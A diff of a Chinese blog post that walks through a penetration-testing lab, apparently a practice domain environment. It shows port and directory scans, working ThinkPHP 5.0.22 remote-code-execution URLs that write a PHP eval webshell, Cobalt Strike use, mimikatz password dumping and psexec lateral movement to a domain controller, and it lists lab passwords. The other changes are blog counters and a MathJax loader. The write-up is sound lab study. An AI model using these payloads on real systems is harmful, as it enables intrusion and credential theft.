@@ -310,42 +310,45 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><blockquote>
-<p>2008     192.168.138.138(内网)             sun\admin 2021.com</p>
-<p>win7     192.168.138.136(内网)            192.168.135.150(外网)</p>
-<p>sun\leo123.com    sun\Administrator dc123.com</p>
+        <h3 id="环境搭建">环境搭建</h3>
+<blockquote>
+<p>2008 192.168.138.138(内网) sun2021.com</p>
+<p>win7 192.168.138.136(内网) 192.168.135.150(外网)</p>
+<p>sun123.com sundc123.com</p>
 <p>启动phpstudy</p>
-<p>kali        192.168.135.128(外网)</p>
+<p>kali 192.168.135.128(外网)</p>
 </blockquote>
-<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><code>sudo nmap -sV 192.168.135.150 </code></p>
+<h3 id="信息收集">信息收集</h3>
+<h4 id="端口扫描">端口扫描</h4>
+<p><code>sudo nmap -sV 192.168.135.150</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.135.150</span><br><span class="line">Host is up (0.00042s latency).</span><br><span class="line">Not shown: 991 filtered ports</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">80/tcp    open  http         Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.5.38)</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: SUN)</span><br><span class="line">3306/tcp  open  mysql        MySQL (unauthorized)</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49176/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">MAC Address: 00:0C:29:B5:F4:E9 (VMware)</span><br><span class="line">Service Info: Host: WIN7; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
-
 <p>开放了80，3306 系统为Win7</p>
-<h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p><code>dirmap -i 192.168.135.150 -lcf</code></p>
+<h4 id="目录扫描">目录扫描</h4>
+<p><code>dirmap -i 192.168.135.150 -lcf</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[+] Load targets from: 192.168.135.150</span><br><span class="line">[+] Set the number of thread: 30</span><br><span class="line">[+] Coroutine mode</span><br><span class="line">[+] Current target: http://192.168.135.150/                                                 </span><br><span class="line">[*] Launching auto check 404</span><br><span class="line">[+] Checking with: http://192.168.135.150/hsnwdxgvjhcohdgnyqwwyagtdjaanxwsamkblggcfg</span><br><span class="line">[*] Use recursive scan: No                                                                  </span><br><span class="line">[*] Use dict mode</span><br><span class="line">[+] Load dict:/home/kali/Tools/dirmap/data/dict_mode_dict.txt</span><br><span class="line">[*] Use crawl mode</span><br><span class="line">[200][text/html; charset=utf-8][931.00b] http://192.168.135.150/0                           </span><br><span class="line">[200][text/html; charset=utf-8][1.60kb] http://192.168.135.150/add.php                      </span><br><span class="line">[200][image/x-icon][1.12kb] http://192.168.135.150/favicon.ico                              </span><br><span class="line">[200][text/html; charset=utf-8][931.00b] http://192.168.135.150/Index                        </span><br><span class="line">[200][text/html; charset=utf-8][931.00b] http://192.168.135.150/index                        </span><br><span class="line">[200][text/html; charset=utf-8][931.00b] http://192.168.135.150/index.html                   </span><br><span class="line">[200][text/html; charset=utf-8][931.00b] http://192.168.135.150/index.php                    </span><br><span class="line">[200][text/html; charset=utf-8][931.00b] http://192.168.135.150/INDEX.PHP                    </span><br><span class="line">[200][text/html; charset=utf-8][931.00b] http://192.168.135.150/index.PHP                    </span><br><span class="line">[200][text/plain][24.00b] http://192.168.135.150/robots.txt    </span><br></pre></td></tr></table></figure>
-
 <p>查看报错页面可以发现为thinkphp V5.0.22</p>
-<p>扫到一个大马  <code>http://192.168.135.150/add.php</code> 但是不知道密码多少</p>
+<p>扫到一个大马 <code>http://192.168.135.150/add.php</code>
+但是不知道密码多少</p>
 <p><img src="/posts/4f399e45/dama.png"></p>
-<h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><p>访问80端口 版本为 thinkphp  V5.0.22</p>
+<h3 id="外网打点">外网打点</h3>
+<p>访问80端口 版本为 thinkphp V5.0.22</p>
 <p>POC</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># whoami</span><br><span class="line">http://192.168.135.150/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line"># phpinfo</span><br><span class="line">http://192.168.135.150/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line"># pwd</span><br><span class="line">http://192.168.135.150/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=powershell%20pwd</span><br><span class="line"># 写一句话</span><br><span class="line"># 如果是linux使用echo写入文件 如果是win使用file_put_contents写入</span><br><span class="line"># ?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20^%3C?php%20@eval($_GET[%22pass%22])?^%3E%3Eshell.php</span><br><span class="line"># ?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=%3C%3Fphp%20eval(%24_POST%5B&#x27;pass&#x27;%5D)%3B%3F%3E</span><br><span class="line">http://192.168.135.150/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=%3C%3Fphp%20eval(%24_POST[%27shell%27])%3B%3F%3E</span><br></pre></td></tr></table></figure>
-
-<p>然后使用蚁剑连接 </p>
+<p>然后使用蚁剑连接</p>
 <p><img src="/posts/4f399e45/ant_shell.png"></p>
 <p>发现是admin权限</p>
-<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><p>上线CS 为administrator权限</p>
+<h3 id="内网渗透">内网渗透</h3>
+<p>上线CS 为administrator权限</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">信息整理</span><br><span class="line">win7</span><br><span class="line">ip 192.168.138.136(内网)  192.168.135.150(外网)   DCip 192.168.138.138</span><br><span class="line">域 sun.com</span><br><span class="line">补丁      [01]: KB2534111</span><br><span class="line">          [02]: KB2999226</span><br><span class="line">          [03]: KB976902</span><br><span class="line">http://bugs.hacking8.com/tiquan/</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>然后进行提权，但这里使用ms15-051 和 ms14-058都没成功</p>
-<p>使用CS run mimikatz  读取到了Administrator 和 leo 的密码</p>
+<p>使用CS run mimikatz 读取到了Administrator 和 leo 的密码</p>
 <p><img src="/posts/4f399e45/logonpassword.png"></p>
-<p>扫描一下内网中的主机 445 </p>
+<p>扫描一下内网中的主机 445</p>
 <p><code>portscan 192.168.138.0/24 445 arp 50</code></p>
 <p>尝试使用抓到的leo用户 进行psexec</p>
 <p><img src="/posts/4f399e45/psexec_win_system.png"></p>
 <p>得到win7 system权限</p>
-<p>由于DC不出网使用win7作为跳板机建立Listener </p>
+<p>由于DC不出网使用win7作为跳板机建立Listener</p>
 <p><img src="/posts/4f399e45/neiwang1.png"></p>
 <p><img src="/posts/4f399e45/neiwang2.png"></p>
 <p>然后通过psexec 上线DC 得到DC机器的system全息</p>
@@ -500,7 +503,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -548,7 +551,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -562,7 +565,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -573,7 +576,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -713,6 +716,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
